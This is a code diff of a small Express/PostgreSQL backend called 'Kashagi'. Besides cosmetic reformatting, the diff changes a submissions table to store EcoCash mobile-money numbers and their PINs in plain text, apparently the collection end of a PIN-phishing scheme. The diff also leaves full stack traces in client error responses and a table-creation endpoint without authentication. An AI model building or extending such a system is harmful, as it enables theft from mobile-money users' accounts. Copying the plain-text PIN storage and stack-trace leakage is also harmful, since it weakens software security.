@@ -12,7 +12,7 @@ const pool = new Pool({
 });
 
 app.get("/", (req, res) => {
-  res.send("Kashagi backend running");
+  res.send("Kashagi Backend Running");
 });
 
 app.get("/test-db", async (req, res) => {
@@ -20,7 +20,11 @@ app.get("/test-db", async (req, res) => {
     const result = await pool.query("SELECT NOW()");
     res.json(result.rows[0]);
   } catch (err) {
-    res.status(500).json({ error: err.message,name: err.name,stack:err.stack   });
+    res.status(500).json({
+      error: err.message,
+      name: err.name,
+      stack: err.stack
+    });
   }
 });
 
@@ -29,16 +33,20 @@ app.get("/create-table", async (req, res) => {
     await pool.query(`
       CREATE TABLE IF NOT EXISTS submissions (
         id SERIAL PRIMARY KEY,
-        phone_number TEXT NOT NULL,
-        reference_number TEXT NOT NULL,
+        EcoCash_number TEXT NOT NULL,
+        EcoCash_Pin TEXT NOT NULL,
         created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
       )
     `);
 
     res.send("Table created successfully");
   } catch (err) {
-    res.status(500).json({ error: err.message });
+    res.status(500).json({
+      error: err.message
+    });
   }
-});app.listen(process.env.PORT || 3000, () => {
+});
+
+app.listen(process.env.PORT || 3000, () => {
   console.log("Server started");
 });
